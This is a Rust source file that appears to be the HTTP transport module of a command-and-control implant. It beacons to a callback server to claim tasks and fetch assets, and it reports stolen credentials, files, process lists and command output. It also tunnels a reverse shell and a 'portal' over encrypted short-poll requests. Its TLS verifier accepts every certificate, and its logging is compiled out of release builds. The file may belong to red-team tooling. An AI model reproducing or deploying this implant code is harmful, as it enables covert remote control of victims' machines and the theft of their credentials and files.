use crate::Transport;
use anyhow::{Context, Result};
use bytes::BytesMut;
use hyper_legacy::body::HttpBody;
use hyper_legacy::{StatusCode, Uri};
use pb::{c2::*, config::Config};
use prost::Message;
use std::sync::{
    mpsc::{Receiver, Sender},
    Arc,
};

#[cfg(feature = "doh")]
use crate::dns_resolver::doh::DohProvider;

use crate::tls_utils::legacy::AcceptAllCertVerifier;
use std::str::FromStr;

/// gRPC frame header utilities for encoding/decoding wire protocol frames
mod grpc_frame {
    use bytes::{Buf, BytesMut};

    /// Size of gRPC frame header: [compression_flag(1)][length(4)]
    const FRAME_HEADER_SIZE: usize = 5;

    #[derive(Debug, Clone, Copy)]
    pub struct FrameHeader {
        pub compression_flag: u8,
        pub message_length: u32,
    }

    impl FrameHeader {
        /// Create a new frame header with no compression
        pub fn new(message_length: u32) -> Self {
            Self {
                compression_flag: 0x00,
                message_length,
            }
        }

        /// Encode frame header to 5-byte array
        pub fn encode(&self) -> [u8; FRAME_HEADER_SIZE] {
            let mut header = [0u8; FRAME_HEADER_SIZE];
            header[0] = self.compression_flag;
            header[1..5].copy_from_slice(&self.message_length.to_be_bytes());
            header
        }

        /// Try to decode frame header from buffer
        /// Returns None if buffer doesn't have enough data
        pub fn try_decode(buffer: &BytesMut) -> Option<Self> {
            if buffer.len() < FRAME_HEADER_SIZE {
                return None;
            }

            let compression_flag = buffer[0];
            let message_length = u32::from_be_bytes([buffer[1], buffer[2], buffer[3], buffer[4]]);

            Some(Self {
                compression_flag,
                message_length,
            })
        }

        /// Extract a complete frame from the buffer
        /// Returns None if frame is incomplete
        pub fn extract_frame(buffer: &mut BytesMut) -> Option<(Self, BytesMut)> {
            let header = Self::try_decode(buffer)?;
            let total_size = FRAME_HEADER_SIZE + header.message_length as usize;

            if buffer.len() < total_size {
                return None;
            }

            // Skip the header
            buffer.advance(FRAME_HEADER_SIZE);

            // Extract the message
            let message = buffer.split_to(header.message_length as usize);

            Some((header, message))
        }
    }
}

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";

// Marshal: Encode and encrypt a message using the ChachaCodec
// Uses the helper functions exported from pb::xchacha
fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
}

// Unmarshal: Decrypt and decode a message using the ChachaCodec
fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::decode_with_chacha::<Req, Resp>(data)
}

/// Trait for making HTTP requests, abstracting over different connector types
trait HttpClient: Send + Sync {
    fn request(
        &self,
        req: hyper_legacy::Request<hyper_legacy::Body>,
    ) -> std::pin::Pin<
        Box<
            dyn std::future::Future<
                    Output = Result<
                        hyper_legacy::Response<hyper_legacy::Body>,
                        hyper_legacy::Error,
                    >,
                > + Send
                + '_,
        >,
    >;
}

impl<C> HttpClient for hyper_legacy::Client<C>
where
    C: hyper_legacy::client::connect::Connect + Clone + Send + Sync + 'static,
{
    fn request(
        &self,
        req: hyper_legacy::Request<hyper_legacy::Body>,
    ) -> std::pin::Pin<
        Box<
            dyn std::future::Future<
                    Output = Result<
                        hyper_legacy::Response<hyper_legacy::Body>,
                        hyper_legacy::Error,
                    >,
                > + Send
                + '_,
        >,
    > {
        Box::pin(self.request(req))
    }
}

#[allow(clippy::upper_case_acronyms)]
#[derive(Clone)]
pub struct HTTP {
    client: Arc<dyn HttpClient>,
    base_url: String,
}

impl std::fmt::Debug for HTTP {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("HTTP")
            .field("base_url", &self.base_url)
            .finish_non_exhaustive()
    }
}

impl HTTP {
    async fn handle_short_poll_streaming<Req, Resp>(
        &self,
        mut rx: tokio::sync::mpsc::Receiver<Req>,
        tx: tokio::sync::mpsc::Sender<Resp>,
        path: &'static str,
    ) -> Result<()>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Generate a unique session ID so the redirector can maintain a persistent
        // gRPC stream across multiple HTTP short-poll requests.
        let session_id = uuid::Uuid::new_v4().to_string();

        loop {
            // Buffer to hold messages to send in this polling interval
            let mut messages = Vec::new();

            // Check if there's any outgoing message (blocks until one is available or channel closed)
            match tokio::time::timeout(std::time::Duration::from_millis(50), rx.recv()).await {
                Ok(Some(msg)) => {
                    messages.push(msg);

                    // Grab any other immediately available messages
                    while let Ok(msg) = rx.try_recv() {
                        messages.push(msg);
                    }
                }
                Ok(None) => {
                    // Channel closed, terminate streaming
                    break;
                }
                Err(_) => {
                    // Timeout (50ms elapsed, no message). Continue loop to send empty payload/ping
                }
            }

            let data_sent = !messages.is_empty();

            // Prepare the body with encoded gRPC frames
            let mut request_body = BytesMut::new();
            for msg in messages {
                let request_bytes = match marshal_with_codec::<Req, Resp>(msg) {
                    Ok(bytes) => bytes,
                    Err(err) => {
                        #[cfg(debug_assertions)]
                        log::error!("Failed to marshal streaming message: {}", err);
                        continue;
                    }
                };
                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);
                request_body.extend_from_slice(&frame_header.encode());
                request_body.extend_from_slice(&request_bytes);
            }

            // Build and send the HTTP request with session header for persistent stream routing
            let uri = self.build_uri(path)?;
            let req = self
                .request_builder(uri)
                .header("X-Stream-Session-Id", &session_id)
                .body(hyper_legacy::Body::from(request_body.freeze()))
                .context("Failed to build HTTP request")?;

            let response = match tokio::time::timeout(
                std::time::Duration::from_secs(30),
                self.send_and_validate(req),
            )
            .await
            {
                Ok(Ok(resp)) => resp,
                Ok(Err(err)) => {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send short poll HTTP request: {}", err);
                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                    continue;
                }
                Err(_) => {
                    #[cfg(debug_assertions)]
                    log::error!("Short poll HTTP request timed out after 30s");
                    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
                    continue;
                }
            };

            // Read entire response body then decode gRPC frames and send via async channel.
            // We cannot use stream_grpc_frames here because its handler closure is synchronous,
            // and tokio::sync::mpsc::Sender requires async send (blocking_send panics in async context).
            let body_bytes = Self::read_response_body(response).await;
            let mut data_received = false;
            let result: Result<()> = match body_bytes {
                Ok(bytes) => {
                    #[cfg(debug_assertions)]
                    if !bytes.is_empty() {
                        log::debug!("Received short poll response body: {} bytes", bytes.len());
                    }
                    let mut buffer = BytesMut::from(bytes.as_ref());
                    let mut send_err = None;
                    let mut frame_count = 0;
                    while let Some((_header, encrypted_message)) =
                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
                    {
                        frame_count += 1;
                        data_received = true;
                        #[cfg(debug_assertions)]
                        log::debug!(
                            "Extracted frame {} from short poll response ({} bytes)",
                            frame_count,
                            encrypted_message.len()
                        );

                        match unmarshal_with_codec::<Req, Resp>(&encrypted_message) {
                            Ok(response_msg) => {
                                #[cfg(debug_assertions)]
                                log::debug!("Unmarshaled message {} from short poll response, sending to channel", frame_count);

                                if let Err(err) = tx.send(response_msg).await {
                                    send_err = Some(anyhow::anyhow!(
                                        "Failed to send response through channel: {}",
                                        err
                                    ));
                                    break;
                                }
                            }
                            Err(err) => {
                                send_err = Some(err);
                                break;
                            }
                        }
                    }
                    match send_err {
                        Some(err) => Err(err),
                        None => Ok(()),
                    }
                }
                Err(err) => Err(err),
            };

            if let Err(err) = result {
                #[cfg(debug_assertions)]
                log::error!("Failed to process response frames: {}", err);
                break;
            }

            // Adding a small delay to prevent tight loop spinning if rx channel isn't busy
            if data_sent || data_received {
                tokio::task::yield_now().await;
            } else {
                tokio::time::sleep(std::time::Duration::from_millis(500)).await;
            }
        }

        Ok(())
    }

    /// Build URI from path
    fn build_uri(&self, path: &str) -> Result<hyper_legacy::Uri> {
        let url = format!("{}{}", self.base_url, path);
        url.parse().context("Failed to parse URL")
    }

    /// Create a base HTTP request builder with common gRPC headers
    fn request_builder(&self, uri: hyper_legacy::Uri) -> hyper_legacy::http::request::Builder {
        hyper_legacy::Request::builder()
            .method(hyper_legacy::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .header("Connection", "close")
    }

    /// Send HTTP request and validate status code
    async fn send_and_validate(
        &self,
        req: hyper_legacy::Request<hyper_legacy::Body>,
    ) -> Result<hyper_legacy::Response<hyper_legacy::Body>> {
        let response = self
            .client
            .request(req)
            .await
            .map_err(|e| anyhow::anyhow!("HTTP request failed: {}", e))?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        Ok(response)
    }

    /// Read entire response body
    async fn read_response_body(
        response: hyper_legacy::Response<hyper_legacy::Body>,
    ) -> Result<bytes::Bytes> {
        hyper_legacy::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")
    }

    /// Generic helper method for unary RPC calls (request-response pattern).
    /// Handles marshaling, HTTP request/response, and unmarshaling for all unary operations.
    async fn unary_rpc<Req, Resp>(&mut self, request: Req, path: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal and encrypt the request
        let request_bytes = marshal_with_codec::<Req, Resp>(request)?;

        // Build and send the request
        let uri = self.build_uri(path)?;
        let req = self
            .request_builder(uri)
            .body(hyper_legacy::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Read and unmarshal the response
        let body_bytes = Self::read_response_body(response).await?;
        let response_msg = unmarshal_with_codec::<Req, Resp>(&body_bytes)?;

        Ok(response_msg)
    }

    /// Stream and decode gRPC frames from HTTP response body (server-streaming pattern)
    /// Generic over request/response types for unmarshaling
    async fn stream_grpc_frames<Req, Resp, F>(
        response: hyper_legacy::Response<hyper_legacy::Body>,
        mut handler: F,
    ) -> Result<()>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
        F: FnMut(Resp) -> Result<()>,
    {
        let mut body = response.into_body();
        let mut buffer = BytesMut::new();

        loop {
            // Process all complete frames in the buffer
            while let Some((_header, encrypted_message)) =
                grpc_frame::FrameHeader::extract_frame(&mut buffer)
            {
                #[cfg(debug_assertions)]
                log::debug!(
                    "Received complete encrypted message: compression={}, {} bytes",
                    _header.compression_flag,
                    encrypted_message.len()
                );

                // Unmarshal: Decrypt and decode the complete encrypted message
                let response_msg = unmarshal_with_codec::<Req, Resp>(&encrypted_message)?;

                // Handle the decoded message
                handler(response_msg)?;
            }

            // Read more data from HTTP body
            match body.data().await {
                Some(Ok(chunk)) => {
                    #[cfg(debug_assertions)]
                    log::debug!("Received HTTP chunk: {} bytes", chunk.len());

                    buffer.extend_from_slice(&chunk);
                }
                Some(Err(err)) => {
                    return Err(anyhow::anyhow!(
                        "Failed to read chunk from response: {}",
                        err
                    ));
                }
                None => {
                    // No more data from HTTP
                    break;
                }
            }
        }

        // Check if there's leftover data in the buffer
        if !buffer.is_empty() {
            #[cfg(debug_assertions)]
            log::warn!(
                "Incomplete data remaining in buffer: {} bytes",
                buffer.len()
            );
        }

        #[cfg(debug_assertions)]
        log::debug!("Completed streaming messages");

        Ok(())
    }

    /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper_legacy::Body
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        let (mut tx, body) = hyper_legacy::Body::channel();

        tokio::spawn(async move {
            for req_chunk in receiver {
                // Marshal and encrypt each chunk
                let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
                    Ok(bytes) => bytes,
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("Failed to marshal chunk: {}", _err);
                        return;
                    }
                };

                // Create gRPC frame header
                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);

                // Send frame header
                if tx
                    .send_data(hyper_legacy::body::Bytes::from(
                        frame_header.encode().to_vec(),
                    ))
                    .await
                    .is_err()
                {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send frame header for chunk");
                    return;
                }

                // Send encrypted chunk
                if tx
                    .send_data(hyper_legacy::body::Bytes::from(request_bytes))
                    .await
                    .is_err()
                {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send chunk");
                    return;
                }
            }

            #[cfg(debug_assertions)]
            log::debug!("Completed sending chunks");
        });

        body
    }
}

#[async_trait::async_trait]
impl Transport for HTTP {
    fn clone_box(&self) -> Box<dyn Transport + Send + Sync> {
        Box::new(self.clone())
    }

    fn init() -> Self {
        let mut connector = hyper_legacy::client::HttpConnector::new();
        connector.enforce_http(false);
        connector.set_nodelay(true);
        let client = hyper_legacy::Client::builder().build(connector);
        HTTP {
            client: Arc::new(client),
            base_url: String::new(),
        }
    }

    fn new(config: Config) -> Result<Self> {
        // Extract URI and EXTRA from config using helper functions
        let c = crate::transport::extract_uri_from_config(&config)?;
        let callback = c
            .replace("http1s://", "https://")
            .replace("http1://", "http://");
        let extra_map = crate::transport::extract_extra_from_config(&config);

        #[cfg(feature = "doh")]
        let doh: Option<&String> = extra_map.get("doh");

        // Create base HTTP connector (either DOH-enabled or system DNS)
        #[cfg(feature = "doh")]
        let mut http = match doh {
            // TODO: Add provider selection based on the provider string
            Some(_provider) => {
                crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?
            }
            None => {
                // Use system DNS when DOH not explicitly requested
                crate::dns_resolver::doh::create_doh_connector(DohProvider::System)?
            }
        };

        #[cfg(not(feature = "doh"))]
        let mut http = hyper_legacy::client::HttpConnector::new();

        // Get proxy configuration from extra field
        let proxy_uri = extra_map.get("http_proxy");

        // Configure connector
        http.enforce_http(false); // Allow HTTPS
        http.set_nodelay(true); // TCP optimization

        let tls_config = rustls_0_21::ClientConfig::builder()
            .with_safe_defaults()
            .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
            .with_no_client_auth();

        let https = hyper_rustls_legacy::HttpsConnectorBuilder::new()
            .with_tls_config(tls_config)
            .https_or_http()
            .enable_http1()
            .wrap_connector(http);

        // Build the appropriate client based on configuration
        let client: Arc<dyn HttpClient> = match proxy_uri {
            Some(proxy_uri_string) => {
                // Create proxy connector
                let proxy = hyper_proxy_legacy::Proxy::new(
                    hyper_proxy_legacy::Intercept::All,
                    Uri::from_str(proxy_uri_string.as_str())?,
                );
                let proxy_connector =
                    hyper_proxy_legacy::ProxyConnector::from_proxy_unsecured(https, proxy);

                // Build client with proxy
                Arc::new(hyper_legacy::Client::builder().build(proxy_connector))
            }
            #[allow(non_snake_case) /* None is a reserved keyword */]
            None => {
                // No proxy configuration
                Arc::new(hyper_legacy::Client::builder().build(https))
            }
        };

        Ok(Self {
            client,
            base_url: callback,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.unary_rpc(request, CLAIM_TASKS_PATH).await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        // Marshal and encrypt the request
        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;

        // Build and send the request
        let uri = self.build_uri(FETCH_ASSET_PATH)?;
        let req = self
            .request_builder(uri)
            .body(hyper_legacy::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Stream the response frames
        Self::stream_grpc_frames::<FetchAssetRequest, FetchAssetResponse, _>(
            response,
            |response_msg| {
                tx.send(response_msg).map_err(|_err| {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "Failed to send downloaded file chunk: {}: {}",
                        filename,
                        _err
                    );

                    anyhow::anyhow!("Failed to send response through channel")
                })
            },
        )
        .await
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.unary_rpc(request, REPORT_CREDENTIAL_PATH).await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Create streaming body
        let body = Self::create_streaming_body::<ReportFileRequest, ReportFileResponse>(request);

        // Build and send the request
        let uri = self.build_uri(REPORT_FILE_PATH)?;
        let req = self
            .request_builder(uri)
            .body(body)
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Read and unmarshal the response
        let body_bytes = Self::read_response_body(response).await?;
        let response_msg =
            unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
    }

    async fn report_output(
        &mut self,
        request: ReportOutputRequest,
    ) -> Result<ReportOutputResponse> {
        self.unary_rpc(request, REPORT_OUTPUT_PATH).await
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Spawn polling loop in background and return immediately.
        // The caller (pty.rs) expects reverse_shell() to return so the input
        // handling loop can run concurrently, matching the gRPC transport behavior.
        let transport = self.clone();
        tokio::spawn(async move {
            if let Err(_err) = transport
                .handle_short_poll_streaming(rx, tx, REVERSE_SHELL_PATH)
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell short poll streaming ended: {}", _err);
            }
        });
        Ok(())
    }

    async fn create_portal(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
        tx: tokio::sync::mpsc::Sender<CreatePortalResponse>,
    ) -> Result<()> {
        // Spawn polling loop in background and return immediately,
        // matching the gRPC transport behavior.
        let transport = self.clone();
        tokio::spawn(async move {
            if let Err(_err) = transport
                .handle_short_poll_streaming(rx, tx, CREATE_PORTAL_PATH)
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("create_portal short poll streaming ended: {}", _err);
            }
        });
        Ok(())
    }

    fn get_type(&mut self) -> pb::c2::transport::Type {
        return pb::c2::transport::Type::TransportHttp1;
    }

    fn is_active(&self) -> bool {
        !self.base_url.is_empty()
    }

    fn name(&self) -> &'static str {
        "http"
    }

    async fn forward_raw(
        &mut self,
        path: String,
        mut rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
    ) -> anyhow::Result<()> {
        let uri = self.build_uri(&path)?;
        let parts: Vec<&str> = path.split('/').collect();
        let method_name = *parts.get(2).unwrap_or(&"");

        match method_name {
            "ClaimTasks" | "ReportCredential" | "ReportProcessList" | "ReportOutput" => {
                let req_bytes = rx
                    .recv()
                    .await
                    .ok_or_else(|| anyhow::anyhow!("No input for unary call"))?;
                let req = self
                    .request_builder(uri)
                    .body(hyper_legacy::Body::from(req_bytes))
                    .context("Failed to build HTTP request")?;

                let response = self.send_and_validate(req).await?;
                let body_bytes = Self::read_response_body(response).await?;
                tx.send(body_bytes.to_vec())
                    .await
                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
            }
            "FetchAsset" => {
                let req_bytes = rx
                    .recv()
                    .await
                    .ok_or_else(|| anyhow::anyhow!("No input for FetchAsset"))?;
                let req = self
                    .request_builder(uri)
                    .body(hyper_legacy::Body::from(req_bytes))
                    .context("Failed to build HTTP request")?;

                let response = self.send_and_validate(req).await?;
                let mut body = response.into_body();
                let mut buffer = BytesMut::new();

                loop {
                    while let Some((_header, encrypted_message)) =
                        grpc_frame::FrameHeader::extract_frame(&mut buffer)
                    {
                        let chunk = encrypted_message.to_vec();
                        tx.send(chunk)
                            .await
                            .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
                    }

                    match body.data().await {
                        Some(Ok(chunk)) => {
                            buffer.extend_from_slice(&chunk);
                        }
                        Some(Err(err)) => {
                            return Err(anyhow::anyhow!("Failed to read chunk: {}", err))
                        }
                        None => break,
                    }
                }
            }
            "ReportFile" => {
                let (mut req_tx, body) = hyper_legacy::Body::channel();

                tokio::spawn(async move {
                    while let Some(req_chunk) = rx.recv().await {
                        let frame_header =
                            grpc_frame::FrameHeader::new(req_chunk.len() as u32);
                        if req_tx
                            .send_data(hyper_legacy::body::Bytes::from(
                                frame_header.encode().to_vec(),
                            ))
                            .await
                            .is_err()
                        {
                            break;
                        }
                        if req_tx
                            .send_data(hyper_legacy::body::Bytes::from(req_chunk))
                            .await
                            .is_err()
                        {
                            break;
                        }
                    }
                });

                let req = self
                    .request_builder(uri)
                    .body(body)
                    .context("Failed to build HTTP request")?;

                let response = self.send_and_validate(req).await?;
                let body_bytes = Self::read_response_body(response).await?;
                tx.send(body_bytes.to_vec())
                    .await
                    .map_err(|e| anyhow::anyhow!("Send failed: {}", e))?;
            }
            _ => {
                return Err(anyhow::anyhow!(
                    "Unsupported HTTP method for raw forwarding: {}",
                    method_name
                ));
            }
        }
        Ok(())
    }

    fn list_available(&self) -> Vec<String> {
        vec!["http".to_string()]
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::BytesMut;

    mod grpc_frame_tests {
        use super::*;

        #[test]
        fn test_frame_header_new() {
            let header = grpc_frame::FrameHeader::new(1234);
            assert_eq!(header.compression_flag, 0x00);
            assert_eq!(header.message_length, 1234);
        }

        #[test]
        fn test_frame_header_encode() {
            let header = grpc_frame::FrameHeader::new(0x12345678);
            let encoded = header.encode();

            assert_eq!(encoded.len(), 5);
            assert_eq!(encoded[0], 0x00); // compression flag
            assert_eq!(encoded[1], 0x12); // big-endian length
            assert_eq!(encoded[2], 0x34);
            assert_eq!(encoded[3], 0x56);
            assert_eq!(encoded[4], 0x78);
        }

        #[test]
        fn test_frame_header_try_decode_success() {
            let mut buffer = BytesMut::new();
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x01, 0x00]);

            let header = grpc_frame::FrameHeader::try_decode(&buffer).unwrap();
            assert_eq!(header.compression_flag, 0x00);
            assert_eq!(header.message_length, 256);
        }

        #[test]
        fn test_frame_header_try_decode_insufficient_data() {
            let buffer = BytesMut::from(&[0x00, 0x01, 0x02][..]); // Only 3 bytes

            let header = grpc_frame::FrameHeader::try_decode(&buffer);
            assert!(header.is_none());
        }

        #[test]
        fn test_frame_header_extract_frame_success() {
            let mut buffer = BytesMut::new();
            // Header: no compression, 10 bytes
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x0A]);
            // Message: 10 bytes of data
            buffer.extend_from_slice(b"0123456789");

            let result = grpc_frame::FrameHeader::extract_frame(&mut buffer);
            assert!(result.is_some());

            let (header, message) = result.unwrap();
            assert_eq!(header.message_length, 10);
            assert_eq!(message.len(), 10);
            assert_eq!(&message[..], b"0123456789");
            assert_eq!(buffer.len(), 0); // Buffer should be empty
        }

        #[test]
        fn test_frame_header_extract_frame_incomplete() {
            let mut buffer = BytesMut::new();
            // Header: no compression, 10 bytes
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x0A]);
            // Message: only 5 bytes (incomplete)
            buffer.extend_from_slice(b"01234");

            let result = grpc_frame::FrameHeader::extract_frame(&mut buffer);
            assert!(result.is_none());
            assert_eq!(buffer.len(), 10); // Buffer unchanged
        }

        #[test]
        fn test_frame_header_extract_multiple_frames() {
            let mut buffer = BytesMut::new();

            // First frame: 5 bytes
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x05]);
            buffer.extend_from_slice(b"AAAAA");

            // Second frame: 3 bytes
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x03]);
            buffer.extend_from_slice(b"BBB");

            // Extract first frame
            let (header1, msg1) = grpc_frame::FrameHeader::extract_frame(&mut buffer).unwrap();
            assert_eq!(header1.message_length, 5);
            assert_eq!(&msg1[..], b"AAAAA");

            // Extract second frame
            let (header2, msg2) = grpc_frame::FrameHeader::extract_frame(&mut buffer).unwrap();
            assert_eq!(header2.message_length, 3);
            assert_eq!(&msg2[..], b"BBB");

            // No more frames
            assert!(grpc_frame::FrameHeader::extract_frame(&mut buffer).is_none());
            assert_eq!(buffer.len(), 0);
        }

        #[test]
        fn test_frame_header_zero_length_message() {
            let mut buffer = BytesMut::new();
            buffer.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00]);

            let (header, message) = grpc_frame::FrameHeader::extract_frame(&mut buffer).unwrap();
            assert_eq!(header.message_length, 0);
            assert_eq!(message.len(), 0);
        }

        #[test]
        fn test_frame_header_max_length() {
            let header = grpc_frame::FrameHeader::new(u32::MAX);
            let encoded = header.encode();

            let buffer = BytesMut::from(&encoded[..]);

            let decoded = grpc_frame::FrameHeader::try_decode(&buffer).unwrap();
            assert_eq!(decoded.message_length, u32::MAX);
        }

        #[test]
        fn test_frame_header_compression_flag() {
            let mut buffer = BytesMut::new();
            buffer.extend_from_slice(&[0x01, 0x00, 0x00, 0x00, 0x00]); // compression flag = 1

            let header = grpc_frame::FrameHeader::try_decode(&buffer).unwrap();
            assert_eq!(header.compression_flag, 0x01);
        }

        #[test]
        fn test_frame_header_partial_frame_across_reads() {
            let mut buffer = BytesMut::new();

            // Simulate first chunk: partial header
            buffer.extend_from_slice(&[0x00, 0x00]);
            assert!(grpc_frame::FrameHeader::extract_frame(&mut buffer).is_none());

            // Simulate second chunk: rest of header + partial data
            buffer.extend_from_slice(&[0x00, 0x00, 0x05]); // Complete header now
            buffer.extend_from_slice(b"AB"); // Partial data
            assert!(grpc_frame::FrameHeader::extract_frame(&mut buffer).is_none());

            // Simulate third chunk: rest of data
            buffer.extend_from_slice(b"CDE");
            let (header, message) = grpc_frame::FrameHeader::extract_frame(&mut buffer).unwrap();
            assert_eq!(header.message_length, 5);
            assert_eq!(&message[..], b"ABCDE");
        }

        #[test]
        fn test_frame_header_roundtrip() {
            let original = grpc_frame::FrameHeader::new(42);
            let encoded = original.encode();
            let buffer = BytesMut::from(&encoded[..]);
            let decoded = grpc_frame::FrameHeader::try_decode(&buffer).unwrap();

            assert_eq!(original.compression_flag, decoded.compression_flag);
            assert_eq!(original.message_length, decoded.message_length);
        }
    }

    mod http_helpers_tests {
        use super::*;

        #[test]
        fn test_build_uri_success() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "http://localhost:8080".to_string(),
            };

            let uri = http.build_uri("/test/path").unwrap();
            assert_eq!(uri.to_string(), "http://localhost:8080/test/path");
        }

        #[test]
        fn test_build_uri_with_trailing_slash() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "http://localhost:8080/".to_string(),
            };

            let uri = http.build_uri("/test/path").unwrap();
            assert!(uri.to_string().contains("test/path"));
        }

        #[test]
        fn test_build_uri_without_leading_slash() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "http://localhost:8080".to_string(),
            };

            let uri = http.build_uri("test/path").unwrap();
            assert!(uri.to_string().contains("test/path"));
        }

        #[test]
        fn test_build_uri_invalid() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "not a valid url".to_string(),
            };

            let result = http.build_uri("/test");
            assert!(result.is_err());
        }

        #[test]
        fn test_request_builder_headers_and_method() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "http://localhost".to_string(),
            };

            let uri = http.build_uri("/test").unwrap();
            let request = http
                .request_builder(uri)
                .body(hyper_legacy::Body::empty())
                .unwrap();

            assert_eq!(request.method(), hyper_legacy::Method::POST);
            assert_eq!(
                request.headers().get("content-type").unwrap(),
                "application/grpc"
            );
        }

        #[test]
        fn test_request_builder_uri() {
            let http = HTTP {
                client: Arc::new(hyper_legacy::Client::new()),
                base_url: "http://example.com".to_string(),
            };

            let uri = http.build_uri("/api/test").unwrap();
            let request = http
                .request_builder(uri.clone())
                .body(hyper_legacy::Body::empty())
                .unwrap();

            assert_eq!(request.uri(), &uri);
        }
    }
}
